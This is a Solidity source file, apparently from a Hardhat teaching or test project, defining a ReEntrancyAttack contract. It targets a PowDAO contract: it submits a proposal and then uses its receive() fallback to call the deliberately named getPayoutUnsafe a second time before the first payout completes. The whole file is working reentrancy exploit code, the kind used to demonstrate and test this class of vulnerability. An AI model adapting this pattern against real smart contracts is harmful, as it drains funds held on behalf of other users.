pragma solidity >=0.8.0 <0.9.0;
// SPDX-License-Identifier: MIT
import "hardhat/console.sol";
import "./PowDAO.sol";
import "hardhat/console.sol";

contract ReEntrancyAttack {
  event Withdraw(address sender, uint256 amount);
  PowDAO powdao;
  bool hasAttacked;

  constructor(address payable contractAddress) {
    hasAttacked = false;
    powdao = PowDAO(contractAddress);
    console.log(contractAddress.balance);
    powdao.submitProposal(1 * 10**18, "Super important proposal, vote YES!");
  }

  function withdraw() public {
    console.log("Withdrawing from PowDAO with gas ", gasleft());
    powdao.getPayoutUnsafe(payable(address(this)));
  }

  function submitProposal() public {
    powdao.submitProposal(1 * 10**18, "Super important proposal, vote YES!");
  }

  receive() external payable {
    console.log("Not attacked yet with gas ", gasleft());
    console.log("receive ether value ", msg.value);
    if (!hasAttacked) {
      console.log("Withdrawing from powdao");
      powdao.getPayoutUnsafe(payable(address(this)));
      hasAttacked = true;
    }
    console.log("Done attacking");
  }
}
